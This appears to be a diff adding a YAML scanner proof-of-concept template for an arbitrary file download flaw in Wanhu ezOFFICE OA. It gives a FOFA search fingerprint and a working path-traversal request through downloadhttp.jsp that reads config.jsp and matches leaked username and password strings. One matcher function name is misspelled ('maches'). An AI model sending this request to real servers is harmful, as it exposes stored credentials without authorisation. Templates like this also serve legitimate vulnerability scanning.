@@ -1,0 +1,15 @@
+id: poc-yaml-wan-hu-ezoffice-downloadhttp-jsp-anyfile-download
+info:
+  name: 万户OA downloadhttp.jsp 任意文件下载漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 万户OA ezoffice
+  fofa: app="万户网络-ezOFFICE"
+requests:
+- method: GET
+  path: /defaultroot/site/templatemanager/downloadhttp.jsp?fileName=../public/edit/jsp/config.jsp
+  expression: status_code == 200 && contains(body,`<%`) && maches(body,`Username =
+    ".*?"`) && matches(body,`Password = ".*?"`) && contains(body,"Style =")
+variables: {}
+transport: http
